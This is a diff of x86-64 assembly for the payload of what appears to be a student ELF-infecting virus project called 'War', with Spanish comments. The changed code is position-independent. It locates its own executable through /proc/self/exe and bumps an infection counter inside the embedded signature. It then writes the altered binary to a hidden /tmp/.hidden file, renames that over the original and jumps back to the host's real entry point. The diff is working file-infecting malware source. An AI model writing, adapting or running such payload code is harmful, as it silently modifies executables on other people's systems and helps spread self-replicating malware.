@@ -1,144 +1,111 @@
 section .text
 global _ft_payload
 
-; ------------------------------------------------------------
-; Datos
-; ------------------------------------------------------------
-section .data
-path_self:      db "/proc/self/exe", 0
-suffix_tmp:     db ".tmp", 0
-firma_str:      db "War version 1.0 (c)oded Oct - 2026 by davgalle - ", 0
-firma_len       equ $ - firma_str
-
-section .bss
-path_binario:   resb 1024
-path_temporal:  resb 1024
-buffer:         resq 1
-size_binario:   resq 1
-offset_firma:   resq 1
-fd_orig:        resq 1
-fd_tmp:         resq 1
-
-section .text
-
 _ft_payload:
     jmp     code_start
 
 data_start:
-new_vaddr:      dq 0xDEADBEEF
-e_entry_orig:   dq 0xDEADBEEF
+entry_delta:    dq 0xDEADBEEF               ; offset 2
+sig_offset:     dq 0xDEADBEEF               ; offset 10
+path_self:      db "/proc/self/exe", 0      ; offset 18
+path_temporal:  db "/tmp/.hidden", 0        ; offset 33
 
 code_start:
-    ; ------------------------------------------------------------
-    ; 1. Obtener path real del binario con readlink
-    ; ------------------------------------------------------------
-    mov     rax, 89                 ; syscall readlink
-    lea     rdi, [rel path_self]
-    lea     rsi, [rel path_binario]
+    push    rbx
+    push    rbp
+    push    r12
+    push    r13
+    push    r14
+    push    r15
+    push    rdx
+
+    call    .get_base
+.get_base:
+    pop     rbx
+    sub     rbx, (.get_base - _ft_payload)
+
+    sub     rsp, 1056
+
+    ; 1. readlink (/proc/self/exe)
+    mov     rax, 89
+    lea     rdi, [rbx + (path_self - _ft_payload)]
+    mov     rsi, rsp
     mov     rdx, 1024
     syscall
     cmp     rax, 0
-    jl      .restore
+    jl      .restore_stack
+    mov     byte [rsp + rax], 0
 
-    ; ------------------------------------------------------------
-    ; 2. Abrir binario en solo lectura
-    ; ------------------------------------------------------------
-    mov     rax, 2                  ; syscall open
-    lea     rdi, [rel path_binario]
-    xor     rsi, rsi                ; O_RDONLY
+    ; 2. open original binary
+    mov     rax, 2
+    mov     rdi, rsp
+    xor     rsi, rsi
     xor     rdx, rdx
     syscall
     cmp     rax, 0
-    jl      .restore
-    mov     [rel fd_orig], rax
+    jl      .restore_stack
+    mov     r14, rax
 
-    ; ------------------------------------------------------------
-    ; 3. Obtener tamaño con lseek
-    ; ------------------------------------------------------------
-    mov     rax, 8                  ; syscall lseek
-    mov     rdi, [rel fd_orig]
+    ; 3. lseek to get file size
+    mov     rax, 8
+    mov     rdi, r14
     xor     rsi, rsi
-    mov     rdx, 2                  ; SEEK_END
+    mov     rdx, 2
     syscall
-    mov     [rel size_binario], rax
+    mov     r15, rax
 
-    ; ------------------------------------------------------------
-    ; 4. Reservar memoria con mmap y leer el binario
-    ; ------------------------------------------------------------
-    mov     rax, 9                  ; syscall mmap
+    ; 4. mmap original binary
+    mov     rax, 9
     xor     rdi, rdi
-    mov     rsi, [rel size_binario]
-    mov     rdx, 3                  ; PROT_READ | PROT_WRITE
-    mov     r10, 2                  ; MAP_PRIVATE
-    mov     r8, [rel fd_orig]
+    mov     rsi, r15
+    mov     rdx, 3
+    mov     r10, 2
+    mov     r8, r14
     xor     r9, r9
     syscall
     cmp     rax, -1
-    je      .restore
-    mov     [rel buffer], rax
+    je      .close_orig
+    mov     r13, rax
 
-    mov     rax, 8                  ; lseek a 0
-    mov     rdi, [rel fd_orig]
-    xor     rsi, rsi
-    xor     rdx, rdx
-    syscall
+    ; 5. Ir al inicio de la firma (sig_offset)
+    mov     rdi, [rbx + 10]             ; rdi = sig_offset
+    add     rdi, r13                    ; rdi = dirección en el mapeo
 
-    mov     rax, 0                  ; read
-    mov     rdi, [rel fd_orig]
-    mov     rsi, [rel buffer]
-    mov     rdx, [rel size_binario]
-    syscall
+    ; 6. Buscar el ÚLTIMO guion '-' de la firma (el de "davgalle - 39775")
+    ;    La firma mide 50 bytes: "War version 1.0 (c)oded Oct - 2026 by davgalle - 39775"
+    ;    Buscamos desde el final hacia atrás hasta encontrar el guion.
+    lea     rdx, [rdi + 50]             ; rdx = final de la firma (aprox)
+    mov     rcx, 60                     ; máximo 60 bytes hacia atrás
+.find_last_dash:
+    dec     rdx
+    cmp     byte [rdx], '-'
+    je      .found_last_dash
+    loop    .find_last_dash
+    jmp     .munmap_buf                 ; no encontrado, abortar
 
-    mov     rax, 3                  ; close
-    mov     rdi, [rel fd_orig]
-    syscall
+.found_last_dash:
+    ; rdx apunta al guion de "davgalle - 39775"
+    ; avanzar 2 bytes: " - " → '3' de 39775
+    add     rdx, 2
 
-    ; ------------------------------------------------------------
-    ; 5. Buscar la firma en el buffer
-    ; ------------------------------------------------------------
-    mov     rdi, [rel buffer]
-    mov     rcx, [rel size_binario]
-    lea     rsi, [rel firma_str]
-    mov     rdx, firma_len
-
-.buscar_firma:
-    cmp     rcx, rdx
-    jl      .restore
-    push    rdi
-    push    rcx
-    mov     rcx, rdx
-    repe    cmpsb
-    pop     rcx
-    pop     rdi
-    je      .firma_encontrada
-    inc     rdi
-    dec     rcx
-    jmp     .buscar_firma
-
-.firma_encontrada:
-    ; rdi apunta al inicio del número (después de la firma)
-    mov     [rel offset_firma], rdi
-
-    ; ------------------------------------------------------------
-    ; 6. Modificar el número en el buffer
-    ; ------------------------------------------------------------
-    ; Convertir string a número
-    xor     r13, r13
+    ; 7. Leer el número de 5 dígitos (39775)
+    push    rdx
+    xor     r12, r12
     mov     rcx, 5
 .conv_num:
-    movzx   eax, byte [rdi]
+    movzx   eax, byte [rdx]
     sub     eax, '0'
-    imul    r13, r13, 10
-    add     r13, rax
-    inc     rdi
+    imul    r12, r12, 10
+    add     r12, rax
+    inc     rdx
     loop    .conv_num
 
-    inc     r13                     ; incrementar
+    inc     r12                         ; incrementar el contador
 
-    ; Convertir número a string (5 dígitos)
-    mov     rax, r13
-    mov     rdi, [rel offset_firma]
-    add     rdi, 4
+    ; 8. Escribir el nuevo número de 5 dígitos
+    pop     rdi                         ; rdi = inicio del número (primer '3')
+    add     rdi, 4                      ; apuntar al último dígito
+    mov     rax, r12
     mov     rcx, 5
 .conv_str:
     xor     rdx, rdx
@@ -149,95 +116,71 @@ code_start:
     dec     rdi
     loop    .conv_str
 
-    ; ------------------------------------------------------------
-    ; 7. Crear path temporal (path_binario + ".tmp")
-    ; ------------------------------------------------------------
-    lea     rdi, [rel path_temporal]
-    lea     rsi, [rel path_binario]
-    call    ft_strcpy
-    lea     rsi, [rel suffix_tmp]
-    call    ft_strcat
-
-    ; ------------------------------------------------------------
-    ; 8. Abrir temporal y escribir el binario modificado
-    ; ------------------------------------------------------------
-    mov     rax, 2                  ; open
-    lea     rdi, [rel path_temporal]
-    mov     rsi, 0x241              ; O_WRONLY | O_CREAT | O_TRUNC
-    mov     rdx, 0755
+    ; 9. open temporal file
+    mov     rax, 2
+    lea     rdi, [rbx + (path_temporal - _ft_payload)]
+    mov     rsi, 0x241
+    mov     rdx, 0x1ed
     syscall
     cmp     rax, 0
-    jl      .restore
-    mov     [rel fd_tmp], rax
+    jl      .munmap_buf
+    mov     r12, rax
 
-    mov     rax, 1                  ; write
-    mov     rdi, [rel fd_tmp]
-    mov     rsi, [rel buffer]
-    mov     rdx, [rel size_binario]
+    ; 10. write infected content to temporal file
+    mov     rax, 1
+    mov     rdi, r12
+    mov     rsi, r13
+    mov     rdx, r15
     syscall
 
-    mov     rax, 74                 ; fsync
-    mov     rdi, [rel fd_tmp]
+    ; 11. fsync
+    mov     rax, 74
+    mov     rdi, r12
     syscall
 
-    mov     rax, 3                  ; close
-    mov     rdi, [rel fd_tmp]
+    ; 12. close temporal file
+    mov     rax, 3
+    mov     rdi, r12
     syscall
 
-    ; ------------------------------------------------------------
-    ; 9. Rename temporal sobre el original
-    ; ------------------------------------------------------------
-    mov     rax, 82                 ; syscall rename
-    lea     rdi, [rel path_temporal]
-    lea     rsi, [rel path_binario]
+    ; 13. chmod temporal file
+    mov     rax, 90
+    lea     rdi, [rbx + (path_temporal - _ft_payload)]
+    mov     rsi, 0x1ed
     syscall
 
-    ; ------------------------------------------------------------
-    ; 10. Saltar a e_entry_orig
-    ; ------------------------------------------------------------
-.restore:
-    ; Calcular base = rbx - new_vaddr
-    call    .get_base
-.get_base:
+.munmap_buf:
+    mov     rax, 11
+    mov     rdi, r13
+    mov     rsi, r15
+    syscall
+
+.close_orig:
+    mov     rax, 3
+    mov     rdi, r14
+    syscall
+
+    ; 14. rename temporal file over original path
+    mov     rax, 82
+    lea     rdi, [rbx + (path_temporal - _ft_payload)]
+    mov     rsi, rsp
+    syscall
+
+.restore_stack:
+    add     rsp, 1056
+
+    pop     rdx
+    pop     r15
+    pop     r14
+    pop     r13
+    pop     r12
+    pop     rbp
     pop     rbx
-    sub     rbx, 0x17               ; offset de next - _ft_payload
-    mov     r12, [rbx + 2]          ; new_vaddr
-    mov     r15, [rbx + 10]         ; e_entry_orig
-    mov     rax, rbx
-    sub     rax, r12
-    add     rax, r15
+
+    call    .get_ip
+.get_ip:
+    pop     rax
+    sub     rax, (.get_ip - _ft_payload)
+    mov     rcx, [rax + 2]
+    add     rax, rcx
     jmp     rax
-
-; ------------------------------------------------------------
-; Funciones auxiliares (strcpy, strcat)
-; ------------------------------------------------------------
-ft_strcpy:
-    ; rdi = dest, rsi = src
-.loop:
-    mov     al, [rsi]
-    mov     [rdi], al
-    test    al, al
-    jz      .done
-    inc     rdi
-    inc     rsi
-    jmp     .loop
-.done:
-    ret
-
-ft_strcat:
-    ; rdi = dest, rsi = src
-.find_end:
-    cmp     byte [rdi], 0
-    je      .copy
-    inc     rdi
-    jmp     .find_end
-.copy:
-    mov     al, [rsi]
-    mov     [rdi], al
-    test    al, al
-    jz      .done
-    inc     rdi
-    inc     rsi
-    jmp     .copy
-.done:
-    ret
